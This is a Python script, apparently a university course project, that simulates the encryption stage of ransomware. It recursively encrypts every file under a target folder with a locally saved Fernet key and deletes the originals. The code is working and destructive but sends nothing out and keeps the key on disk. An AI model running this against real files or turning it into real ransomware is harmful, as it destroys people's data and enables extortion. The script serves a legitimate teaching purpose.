#!/usr/bin/env python3
"""
CSCE 5550 Final Project - Component for File Encryption
This script simulates ransomware by showcasing symmetric encryption.

NOTICE: Only in controlled settings for educational purposes. 
"""

# Import required libraries
from cryptography.fernet import Fernet  # Symmetric encryption library
import os                               # Operating system interface
import sys                              # System-specific parameters and functions

def generate_key():
    """
    Generate a new Fernet encryption key and save it to file.
    This key would be held by the attacker in a real ransomware scenario.
    Returns:
        None
    """
    # Generate a new Fernet key (32-byte URL-safe base64-encoded key)
    key = Fernet.generate_key()
    
    # Save the key to a file for later decryption use
    with open("secret.key", "wb") as key_file:
        key_file.write(key)
    
    # Inform user that key generation was successful
    print("[+] Key generated and saved as secret.key")

def load_key():
    """
    Load the encryption key from the secret.key file.
    This function handles the case when the key file is missing.
    Returns:
        bytes: The encryption key
    """
    try:
        # Attempt to open and read the encryption key file
        return open("secret.key", "rb").read()
    except FileNotFoundError:
        # If key file doesn't exist, inform user and exit
        print("[-] secret.key not found! Run with --genkey first.")
        sys.exit(1)

def encrypt_file(file_path, fernet):
    """
    Encrypt a single file using the Fernet encryption object.
    
    Args:
        file_path (str): Path to the file to be encrypted
        fernet (Fernet): Initialized Fernet encryption object
    
    Returns:
        None
    """
    # Skip already encrypted files to prevent double encryption
    if file_path.endswith(".encrypted") or file_path.endswith("secret.key"):
        return
     
    # Skip directories as they cannot be encrypted directly
    if os.path.isdir(file_path):
        return
         
    try:
        # Read the original file content in binary mode
        with open(file_path, "rb") as file:
            data = file.read()
         
        # Encrypt the file data using the Fernet key
        encrypted = fernet.encrypt(data)
        
        # Create new filename with .encrypted extension
        encrypted_path = file_path + ".encrypted"
         
        # Write the encrypted data to the new file
        with open(encrypted_path, "wb") as enc_file:
            enc_file.write(encrypted)
             
        # Remove the original unencrypted file
        os.remove(file_path)
        print(f"[+] Encrypted: {file_path} → {encrypted_path}")
    except Exception as e:
        # Handle any encryption errors
        print(f"[-] Failed to encrypt {file_path}: {e}")

def encrypt_directory(directory):
    """
    Recursively encrypt all files in a directory.
    
    Args:
        directory (str): Path to the directory to encrypt
    
    Returns:
        None
    """
    # Load the encryption key
    key = load_key()
    
    # Initialize the Fernet encryption object with the key
    f = Fernet(key)
     
    # Walk through the directory tree
    for root, dirs, files in os.walk(directory):
        # Process each file in the current directory
        for name in files:
            file_path = os.path.join(root, name)
            encrypt_file(file_path, f)

def main():
    """
    Main function to handle command-line arguments and execute encryption.
    """
    # Check if user provided any arguments
    if len(sys.argv) < 2:
        # Display usage instructions if no arguments provided
        print("Usage:")
        print("  python3 encrypt.py --genkey          Generate a new key")
        print("  python3 encrypt.py <file_or_folder>  Encrypt a file or folder")
        sys.exit(1)
         
    # Handle key generation request
    if sys.argv[1] == "--genkey":
        generate_key()
    else:
        # Handle file/folder encryption request
        target = sys.argv[1]
        
        # Verify that the target exists
        if not os.path.exists(target):
            print("[-] Target not found!")
            sys.exit(1)
             
        # Determine if target is directory or file and encrypt accordingly
        if os.path.isdir(target):
            print(f"[+] Encrypting directory: {target}")
            encrypt_directory(target)
        else:
            # Encrypt single file
            key = load_key()
            f = Fernet(key)
            encrypt_file(target, f)

# Execute main function when script is run directly
if __name__ == "__main__":
    main()
